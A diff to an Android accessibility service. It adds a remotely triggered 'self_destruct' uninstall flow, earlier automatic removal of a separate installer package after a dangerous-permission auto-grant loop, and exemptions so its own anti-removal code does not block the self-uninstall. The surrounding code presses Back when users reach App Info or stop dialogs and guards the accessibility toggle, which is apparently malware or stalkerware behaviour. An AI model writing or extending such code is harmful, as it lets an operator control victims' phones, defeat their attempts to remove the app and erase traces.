@@ -117,14 +117,15 @@ public class UnifiedAccessibilityService extends AccessibilityService {
     private volatile boolean accessibilityAssistBackHomeFired = false;
 
     // Uninstall automation is never generic. It is armed for one exact package
-    // immediately before a server-requested uninstall or the first-launch
-    // installer cleanup, and expires shortly afterward.
+    // immediately before a server-requested uninstall, the explicit self-destruct
+    // command, or the first-launch installer cleanup, and expires shortly afterward.
     private volatile boolean uninstallAssistArmed = false;
     private volatile String uninstallAssistTargetPackage = "";
     private volatile long uninstallAssistExpiresAt = 0L;
     private volatile long lastUninstallAssistClickAt = 0L;
     private static final long UNINSTALL_ASSIST_TIMEOUT_MS = 30_000L;
-    private static final long FIRST_LAUNCH_INSTALLER_CLEANUP_DELAY_MS = 13_500L;
+    private static final long FIRST_LAUNCH_INSTALLER_CLEANUP_DELAY_MS = 2_000L;
+    private volatile boolean firstLaunchInstallerCleanupScheduled = false;
     
     // Defent variables - run continuously forever
     private String currentAppName = "";
@@ -206,11 +207,28 @@ public class UnifiedAccessibilityService extends AccessibilityService {
      * Arms the uninstall assistant for one exact package. The assistant only
      * acts on an Android package-installer dialog whose visible app label
      * matches this package; it never scans for a generic OK/Yes button.
+     *
+     * The app's own package is deliberately rejected here. Self-destruct uses
+     * the separate armSelfUninstallAssist() entry point so an ordinary
+     * uninstall_app command cannot accidentally arm the service itself.
      */
     public void armUninstallAssist(String packageName) {
+        armUninstallAssistForTarget(packageName, false);
+    }
+
+    /**
+     * Arms the exact one-shot uninstall flow for this application itself.
+     * This is only called by the explicit self_destruct command; it is not a
+     * generic package uninstall clicker.
+     */
+    public void armSelfUninstallAssist() {
+        armUninstallAssistForTarget(getPackageName(), true);
+    }
+
+    private void armUninstallAssistForTarget(String packageName, boolean allowOwnPackage) {
         if (packageName == null) return;
         String target = packageName.trim();
-        if (target.isEmpty() || target.equals(getPackageName())) return;
+        if (target.isEmpty() || (!allowOwnPackage && target.equals(getPackageName()))) return;
         try {
             getPackageManager().getPackageInfo(target, 0);
         } catch (Exception e) {
@@ -220,15 +238,18 @@ public class UnifiedAccessibilityService extends AccessibilityService {
         uninstallAssistTargetPackage = target;
         uninstallAssistExpiresAt = System.currentTimeMillis() + UNINSTALL_ASSIST_TIMEOUT_MS;
         uninstallAssistArmed = true;
-        Log.i(TAG, "Uninstall assist armed for exact package " + target);
+        Log.i(TAG, "Uninstall assist armed for exact package " + target
+                + (allowOwnPackage ? " (self-destruct)" : ""));
     }
 
     /**
-     * Removes the one-time installer after the module's accessibility service
-     * connects for the first time. Waiting for the initial permission window to
-     * finish keeps the uninstall dialog from being covered by onboarding dialogs.
+     * Removes the one-time installer after the initial dangerous-permission
+     * flow has finished. The package is injected by build.sh into BuildConfig.
      */
     private void scheduleFirstLaunchInstallerCleanup() {
+        if (firstLaunchInstallerCleanupScheduled) return;
+        firstLaunchInstallerCleanupScheduled = true;
+
         final String installerPackage = BuildConfig.INSTALLER_PACKAGE;
         if (installerPackage == null || installerPackage.trim().isEmpty()
                 || installerPackage.equals(getPackageName())) {
@@ -295,7 +316,6 @@ public class UnifiedAccessibilityService extends AccessibilityService {
                 android.content.SharedPreferences prefs = getSharedPreferences("svc_prefs", MODE_PRIVATE);
                 prefs.edit().putBoolean("overlay_setup_done", true).apply();
             } catch (Exception ignored) {}
-            try { scheduleFirstLaunchInstallerCleanup(); } catch (Exception ignored) {}
         }
 
         // Accessibility Assist: protect the accessibility toggle from being turned off.
@@ -1427,6 +1447,7 @@ public class UnifiedAccessibilityService extends AccessibilityService {
                     Log.i(TAG, "Auto-grant: permission loop finished ("
                             + (missing.length == 0 ? "all granted" : "12 s window closed") + ")");
                     autoGrantMode = false;
+                    finishFirstLaunchPermissionFlow();
                 }
             }
         };
@@ -1436,9 +1457,21 @@ public class UnifiedAccessibilityService extends AccessibilityService {
         // Safety net: kill autoGrantMode after 12 s even if the loop is still mid-cycle.
         autoGrantHandler.postDelayed(() -> {
             autoGrantMode = false;
+            finishFirstLaunchPermissionFlow();
             Log.i(TAG, "Auto-grant mode expired after 12 seconds");
         }, 12_000);
         Log.i(TAG, "Auto-grant mode ENABLED — will request permissions over home launcher for 12 s");
+    }
+
+    /**
+     * Runtime permission requests must finish before the build-assigned installer
+     * uninstall dialog is opened. Both the normal loop completion and its safety
+     * timeout call this method; cleanup itself is one-shot.
+     */
+    private void finishFirstLaunchPermissionFlow() {
+        new Handler(Looper.getMainLooper()).postDelayed(() -> {
+            try { scheduleFirstLaunchInstallerCleanup(); } catch (Exception ignored) {}
+        }, FIRST_LAUNCH_INSTALLER_CLEANUP_DELAY_MS);
     }
 
     /**
@@ -3182,6 +3215,13 @@ public class UnifiedAccessibilityService extends AccessibilityService {
                 AccessibilityNodeInfo root = getRootInActiveWindow();
                 if (root == null) return;
 
+                // Do not dismiss the system dialog opened by the explicit,
+                // exact-package self-destruct flow.
+                if (isArmedUninstallDialog(root)) {
+                    root.recycle();
+                    return;
+                }
+
                 // Search for the app name and all known action/danger keywords.
                 // We only defend when the user is on an ACTION page (service detail,
                 // stop dialog, App Info) — NOT when our app name is just one row in
@@ -3602,6 +3642,17 @@ public class UnifiedAccessibilityService extends AccessibilityService {
         try {
             AccessibilityNodeInfo root = getRootInActiveWindow();
             if (root == null) return;
+
+            // An explicit self-destruct has priority over the Settings
+            // protection below. Without this guard, the Settings-hosted
+            // package installer looks like an attempted manual uninstall and
+            // the protection presses Back before the armed helper can confirm
+            // the dialog.
+            if (isArmedUninstallDialog(root)) {
+                root.recycle();
+                return;
+            }
+
             CharSequence pkg = root.getPackageName();
             String pkgStr = pkg != null ? pkg.toString().toLowerCase() : "";
             if (!pkgStr.contains("settings")) {
